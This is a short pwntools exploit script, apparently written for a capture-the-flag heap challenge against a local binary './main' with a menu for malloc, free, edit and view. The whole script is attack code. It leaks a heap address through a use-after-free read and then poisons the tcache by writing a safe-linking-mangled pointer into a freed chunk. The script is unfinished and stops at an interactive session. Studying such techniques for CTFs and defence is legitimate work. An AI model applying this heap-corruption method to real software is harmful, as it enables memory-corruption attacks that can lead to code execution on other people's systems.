from pwn import *
elf =context.binary = ELF("./main")
context.log_level ="debug"


io = process()

def malloc(index,size):
  io.sendlineafter(b">>",b"1")
  io.sendlineafter(b">>",str(index))
  io.sendlineafter(b">>",str(size))


def calloc(index,size):
  io.sendlineafter(b">>",b"2")
  io.sendlineafter(b">>",str(index))
  io.sendlineafter(b">>",str(size))

def free(index):
  io.sendlineafter(b">>",b"3")
  io.sendlineafter(b">>",str(index))

def edit(index,payload):
  io.sendlineafter(b">>",b"4")
  io.sendlineafter(b">>",str(index))
  io.sendline(payload)

def view(index):
  io.sendlineafter(b">>",b"5")
  io.sendlineafter(b">>",str(index))

gdb.attach(io)


malloc(0x0,0x48)
malloc(0x1,0x48)
malloc(0x2,0x48)
malloc(0x3,0x48)
free(0x0)
free(0x1)
free(0x2)

view(0x0)
io.recvn(0x1)
heap_leak = int(unpack(io.recvn(0x6),"all"))
heap_base = heap_leak<<12
log.critical(f"heap base:{hex(heap_base)}")

malloc(0x4,0x70)
malloc(0x5,0x70)
malloc(0x6,0x70)

free(0x4)
free(0x5)

payload = pack((heap_base+0xb0)^(heap_base>>12))
edit(0x1,payload)


















io.interactive()
